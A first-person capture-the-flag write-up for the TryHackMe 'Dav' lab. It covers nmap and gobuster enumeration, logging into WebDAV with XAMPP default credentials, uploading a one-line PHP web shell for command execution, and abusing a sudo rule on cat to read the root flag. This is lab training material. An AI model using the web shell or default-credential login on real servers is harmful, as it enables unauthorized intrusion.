Writeup - TryHackMe - Dav - boot2root

First of all, I only had the IP address. Any context.
I started with enumeration:
nmap -sC -sV -p- 10.65.179.197
The scan revealed only one open port:
80/tcp — HTTP (Apache)
Opening the IP in the browser showed the default Apache page. Nothing special or suspicious there.
So the next logical step was directory enumeration.

Using, the goat, Gobuster:
gobuster dir -u http://10.65.179.197/ -w wordlist.txt
I found:
/webdav
Accessing /webdav triggered an authentication prompt.
At this point, I needed credentials.

Researching common WebDAV configurations, I discovered that Apache environments using XAMPP often rely on default credentials:
Username: wampp
Password: xampp
Trying those credentials... It actually worked.
This confirmed the first vulnerability:
The application was using default credentials for WebDAV access.
Once authenticated, I found a file containing a username (wampp) and a hash (Apache MD5 format).
At this stage, I considered cracking the hash, but instead of going directly into brute force, I looked for another angle.

Since WebDAV allows file upload, I tested whether the server executed PHP files.
I created a simple web shell:
<?php system($_GET['cmd']); ?>
After uploading it through WebDAV, I accessed:
http://<target_ip>/webdav/shell.php?cmd=whoami
The output returned:
www-data
That confirmed remote command execution.
At this point, I had an initial foothold.

With command execution established, I checked my privileges:
sudo -l
The output showed:
(ALL) NOPASSWD: /bin/cat
This meant the user www-data could execute /bin/cat as root without a password.
That’s a destructive misconfiguration.
Even though cat is not a shell, it allows arbitrary file reading.
Since I could run cat as root, I accessed:
sudo cat /home/merlin/user.txt
sudo cat /root/root.txt
And successfully retrieved the user and the root flag.
